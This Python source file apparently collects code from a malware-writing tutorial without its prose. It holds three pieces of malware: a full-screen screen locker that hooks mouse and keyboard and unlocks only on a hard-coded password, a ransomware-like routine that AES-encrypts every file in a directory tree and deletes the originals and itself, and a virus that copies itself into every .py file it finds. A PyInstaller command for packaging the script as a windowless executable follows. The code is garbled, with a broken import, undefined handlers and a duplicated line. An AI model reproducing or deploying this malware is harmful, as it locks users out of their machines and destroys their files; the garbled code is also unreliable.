import pyautogui
from tkinter import Tk, Entry, Label
from pyautogu соi import click, moveTo
from time import sleep
import os
import sys
import pythoncom, pyHook
def on_closing():
    # Click in the center of the screen
    click(width/2, height/2)
    # Move the cursor to the center of the screen
    moveTo(width/2, height/2)
    # Enable full-screen mode
    root.attributes("-fullscreen", True)
    # If the user attempts to close the window from the Task Manager, call on_closing
    root.protocol("WM_DELETE_WINDOW", on_closing)
    # Enable continuous updating of the window
    root.update()
    # Add a key combination that closes the program
    root.bind('<Control-KeyPress-c>', callback)
def callback(event):
    global k, entry
    if entry.get() == "xakep":
        k = True
 Create window
root = Tk()
# Disable protection of the upper left corner of the screen
pyautogui.FAILSAFE = False
# Get window width and height
width = root.winfo_screenwidth()
height = root.winfo_screenheight()
# Set the window title
root.title('From "Xakep" with love')
# Make the window full-screen
root.attributes("-fullscreen", True)
# Create entry field, set its size and location
entry = Entry(root, font=1)
entry.place(width=150, height=50, x=width/2-75, y=height/2-25)
# Create text captions and set their location
label0 = Label(root, text="╚(•⌂•)╝ Locker by Xakep (╯°□°）╯︵ ┻━┻", font=1)
label0.grid(row=0, column=0)
label1 = Label(root, text="Enter password and press Ctrl + C", font='Arial 20')
label1.place(x=width/2-75-130, y=height/2-25-100)
# Enable continuous updates of the window and pause on
root.update()
sleep(0.2)
# Click in the center of the window
click(width/2, height/2)
# Reset the key to zero
k = False
# Continuously check if the right key is entered
# If the right key is entered, call the hooligan function
while not k:
    on_closing()
hm = pyHook.HookManager()
hm.MouseAll = uMad
hm.KeyAll = uMad
hm.HookMouse()
hm.HookKeyboard()
pythoncom.PumpMessages()
direct = input("Specify the target directory: ")
password = input("Enter the password: ")
with open("Crypt.py", "w") as crypt:
    crypt.write('''
    program code
    ''')
def crypt(file):
    import pyAesCrypt
    print('-' * 80)
    # Set password and buffer size
    password = "'''+str(password)+'''"
    buffer_size = 512*1024
    # Call encryption function
    pyAesCrypt.encryptFile(str(file), str(file) + ".crp", password, buffer_size)
    print("[Encrypt] '"+str(file)+".crp'")
    # Remove the original file
    os.remove(file)
def walk(dir):
    # Parse all subfolders in the given folder
    for name in os.listdir(dir):
        path = os.path.join(dir, name)
        # If this is a file, encrypt it
        if os.path.isfile(path):
            crypt(path)
        # If this is a folder, repeat recursively
        else:
            walk(path)
walk("'''+str(direct)+'''")
os.remove(str(sys.argv[0]))
def code(void):
    print("Infected")
def walk(dir):
    for name in os.listdir(dir):
        path = os.path.join(dir, name)
        # If a file is found, check its extension
        if os.path.isfile(path):
            # If the file extension is py, call virus
            if (os.path.splitext(path)[1] == ".py"):
                virus(path)
            else:
                pass
        else:
            # If this is a folder, go into it
            walk(path)
def virus(python):
    begin = "# START #\n"
    end = "# STOP #\n"
    # Read the attacked file, name it "copy"
    with open(sys.argv[0], "r") as copy:
        # Create flag
        k = 0
        # Create a variable for the virus code and add an empty string
        virus_code = "\n"
        # Parse the attacked file line-by-line
        for line in copy:
            # If the beginning marker is found, set flag
            if line == begin:
                k = 1
                # Add marker to the infected code
                virus_code += begin
            # If passed through the beginning but hasn't reached the end yet, copy the string
            elif k == 1 and line != end:
                virus_code += line
            # If reached the end, add final marker and exit the cycle
            elif line == end:
                virus_code += end
                break
            else:
                pass
    # Read the infected file again
    with open(python, "r") as file:
        # Create a variable for the original code
        original_code = ""
        # Copy infected code line-by-line
        for line in file:
            original_code += line
            # If the virus beginning marker found, stop and set the vir flag
            if line == begin:
                vir = True
                break
            # If no marker found, remove the vir flag
            else:
                vir = False
    # If there is no vir flag, write the virus code and original code to the file
    if not vir:
        with open(python, "w") as paste:
            paste.write(virus_code + "\n\n" + original_code)
    else:
        pass
PyInstaller "file_name.py" --onefile --noconsolePyInstaller "file_name.py" --onefile --noconsole
